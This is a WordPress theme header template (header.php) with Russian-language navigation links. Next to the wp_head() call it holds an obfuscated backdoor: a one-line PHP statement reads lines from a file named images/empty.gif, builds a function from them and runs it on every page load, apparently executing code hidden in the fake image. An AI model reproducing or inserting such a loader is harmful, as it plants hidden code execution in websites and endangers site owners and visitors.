<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title><?php bloginfo('name'); ?><?php wp_title(); ?></title>
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />

<!--[if lte IE 6]>
<link rel="stylesheet" href="<?php bloginfo('template_directory'); ?>/ie6.css" type="text/css" media="screen">
<![endif]-->

<!--[if IE 7]>
<style>
#task-nav {margin-left: 60px;}
</style>
<![endif]-->

<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php wp_get_archives('type=monthly&format=link'); ?>
<?php //comments_popup_script(); // off by default ?>
<?php if (is_single() and ('open' == $post-> comment_status) or ('comment' == $post-> comment_type) ) { ?> <script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/prototype.js.php"></script> <script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/effects.js.php"></script> <script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/ajax_comments.js"></script> <?php } ?>

<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>

</head>

<body>

<!-- wrapper start -->
<div id="wrapper">

<!-- header start -->
	<div id="header">

<!-- navigation start -->
		<div id="navigation">
			<a id="nav-home" href="<?php bloginfo('url'); ?>">Главная</a>
			<a id="nav-about" href="<?php bloginfo('url'); ?>/?page_id=2">Об авторе</a>
			<a id="nav-contact" href="<?php bloginfo('url'); ?>">Контакт</a>
			<a id="nav-faq" href="<?php bloginfo('url'); ?>/?page_id=3">FAQ</a>
		</div>
<!-- navigation end -->

		<div id="headline">
			<h1><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></h1>
			<h2><?php bloginfo('description'); ?></h2>
		</div>
		<div class="endline"></div>

    </div>
<!-- header end -->